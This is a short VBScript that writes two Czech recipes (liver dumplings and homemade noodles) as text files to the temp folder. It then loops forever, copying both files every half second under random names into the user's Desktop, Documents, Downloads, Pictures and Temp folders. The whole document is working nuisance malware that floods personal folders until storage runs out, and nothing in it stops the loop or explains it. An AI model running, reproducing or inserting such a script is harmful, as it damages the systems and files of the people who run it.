Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

tempPath = WshShell.ExpandEnvironmentStrings("%TEMP%")
Set file1 = FSO.CreateTextFile(tempPath & "\JatrovyKnedlicek.txt", True)
file1.WriteLine "Na játrové knedlíčky smíchej asi 200 g jemně mletých kuřecích nebo vepřových jater s jedním vejcem, hrstí strouhanky, nasekanou cibulí osmaženou na másle, lisovaným česnekem, trochou majoránky, pepře, soli a špetkou muškátového květu; vzniklou hmotu nech chvíli odpočinout, pak z ní tvaruj malé knedlíčky a vař je asi 5–7 minut v horkém vývaru, dokud nevyplavou a neztuhnou – jsou ideální do polévky nebo k pečivu."
file1.Close
Set file2 = FSO.CreateTextFile(tempPath & "\DomaciNudleChacha.txt", True)
file2.WriteLine "Na domácí nudle smíchej 200 g hladké mouky se dvěma vejci a špetkou soli, vypracuj tuhé těsto, nech ho asi 10 minut odpočinout, pak ho rozválej na tenký plát, nech ho trochu proschnout, sroluj a nakrájej na tenké proužky; nudle rozprostři, nech doschnout a pak je vař v osolené vodě asi 2–3 minuty, dokud nevyplavou a nejsou měkké."
file2.Close

userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")

Do While True
    ' Copy to all target folders
    folders = Array(userProfile & "\Desktop", userProfile & "\Documents", userProfile & "\Downloads", userProfile & "\Pictures", tempPath)
    
    For Each folder In folders
        If FSO.FolderExists(folder) Then
            Randomize
            num = Int((32767 * Rnd) + 1)
            FSO.CopyFile tempPath & "\JatrovyKnedlicek.txt", folder & "\JatrovyKnedlicek_" & num & ".txt", True
            FSO.CopyFile tempPath & "\DomaciNudleChacha.txt", folder & "\DomaciNudleChacha_" & num & ".txt", True
        End If
    Next
    
    WScript.Sleep 500
Loop
